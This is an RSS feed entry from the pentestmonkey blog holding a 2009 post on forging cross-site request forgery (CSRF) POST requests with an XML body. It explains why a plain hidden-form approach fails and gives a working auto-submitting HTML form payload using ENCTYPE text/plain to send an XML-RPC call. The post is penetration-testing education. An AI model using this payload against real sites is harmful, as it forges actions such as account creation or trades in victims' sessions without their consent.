<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	>

<channel>
	<title>csrf &#8211; pentestmonkey</title>
	<atom:link href="https://pentestmonkey.net/tag/csrf/feed" rel="self" type="application/rss+xml" />
	<link>https://pentestmonkey.net</link>
	<description>Taking the monkey work out of pentesting</description>
	<lastBuildDate>Sat, 20 Aug 2011 15:38:46 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=5.8.3</generator>
	<item>
		<title>Cross-Site Request Forgery For POST Requests With An XML Body</title>
		<link>https://pentestmonkey.net/blog/csrf-xml-post-request</link>
					<comments>https://pentestmonkey.net/blog/csrf-xml-post-request#respond</comments>
		
		<dc:creator><![CDATA[pentestmonkey]]></dc:creator>
		<pubDate>Sun, 06 Dec 2009 13:55:20 +0000</pubDate>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[csrf]]></category>
		<category><![CDATA[pentest]]></category>
		<guid isPermaLink="false">http://pentestmonkey.net/?p=80</guid>

					<description><![CDATA[I recently had cause to create a proof-of-concept for a site that seemed to be vulnerable to Cross-Site Request Forgery (CSRF).  I say &#8220;seemed&#8221; because there was no CSRF protection, but I was finding the XML POST body really hard to forge (It was a SOAP / XMLRPC type request). Eventually Sid from notsosecure.com pointed [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>I recently had cause to create a proof-of-concept for a site that seemed to be vulnerable to Cross-Site Request Forgery (CSRF).  I say &#8220;seemed&#8221; because there was no CSRF protection, but I was finding the XML POST body really hard to forge (It was a SOAP / XMLRPC type request).</p>
<p>Eventually Sid from <a href="http://www.notsosecure.com">notsosecure.com</a> pointed me in the right direction.  The solution is not new, but it&#8217;s interesting if you&#8217;ve never come across this problem before.</p>
<p><span id="more-80"></span></p>
<h3>What I Was Trying To Achieve</h3>
<p>I wanted to write a malicious web page, which would automatically send a request like the one below when a victim viewed it:</p>
<pre>POST /createnewuser HTTP/1.1
Host: site.being.tested.com
Cookie: mysessionid=90450874698749829

&lt;?xml version value='"1.0"?&gt;&lt;methodCall&gt;... new creds go here...&lt;/methodCall&gt;</pre>
<h3>The Stuff That Didn&#8217;t Work</h3>
<p>The most obvious approach is probably to have JavaScript automatically sumbit a form containing a hidden form field.  Below is my initial attempt.  Note that I stuff the XML into the &#8220;name&#8221; of a POST parameter.</p>
<pre> &lt;FORM action="http://site.being.tested.com/createnewuser" METHOD="POST"&gt;
 &lt;input type="hidden" name="&lt;?xml version..."&gt;
 &lt;/FORM&gt;
 &lt;script&gt;document.forms[0].submit();&lt;/script&gt;</pre>
<p>This fails for 2 important reasons:</p>
<ol>
<li>The &#8220;name&#8221; containing my XML gets URL encoded thereby corrupting the body of the POST request</li>
<li>There&#8217;s a stray &#8220;=&#8221; at the end of the request.  POST requests bodies are of the form &#8220;name=value&amp;name2=value2&#8221;.  Since I specified only a single name with no value, the browser quite rightly appended an &#8220;=&#8221; after the name.</li>
</ol>
<p>So my forged POST request looked something like this:</p>
<pre>POST /createnewuser HTTP/1.1
Host: site.being.tested.com
Cookie: mysessionid=90450874698749829

%3C%3Fxml%20version%20value%3D'%221.0%22%3F%3E%3CmethodCall%3E...%20new%20creds%20go%20here...%3C%2FmethodCall%3E=</pre>
<p>No where close!</p>
<p>I also considered JavaScript&#8217;s XMLHttpRequest and Flash&#8217;s XML.Send, but these obviously won&#8217;t work because the request is cross-domain.</p>
<h3>The Solution</h3>
<p><a href="http://www.notsosecure.com">Sid</a> pointed out that  Shreeraj Shah presented an elegant solution to this problem in slide 34 of his <a href="http://conference.hackinthebox.org/hitbsecconf2008kl/materials/D2T2%20-%20Shreeraj%20Shah%20-%20Top%2010%20Web%202.0%20Attacks.pdf">HITB presentation in 2008</a>.</p>
<p>To quote from his presentation, the poc should specify an ENCTYPE of  &#8220;text/plain&#8221;:</p>
<pre>&lt;FORM NAME="buy" ENCTYPE="text/plain"
action="http://trade.example.com/xmlrpc/trade.rem" METHOD="POST"&gt;
&lt;input type="hidden" name='&lt;?xml version'
value='"1.0"?&gt;&lt;methodCall&gt;&lt;methodName&gt;stocks.buy&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;string&gt;MSFT&lt;/string&gt;&lt;/value&gt;&lt;/param&gt;&lt;param&gt;&lt;value&gt;&lt;double&gt;26&lt;/double&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;'&gt;
&lt;/FORM&gt;
&lt;script&gt;document.buy.submit();&lt;/script&gt;</pre>
<p>This results in a perfectly formatted Cross-Domain XML POST request.  The ENCTYPE avoids the body being encoded and he cleverly absorbs the unwanted &#8220;=&#8221; into the XML at a point where we need an &#8220;=&#8221; anyway.</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
]]></content:encoded>
					
					<wfw:commentRss>https://pentestmonkey.net/blog/csrf-xml-post-request/feed</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
	</channel>
</rss>
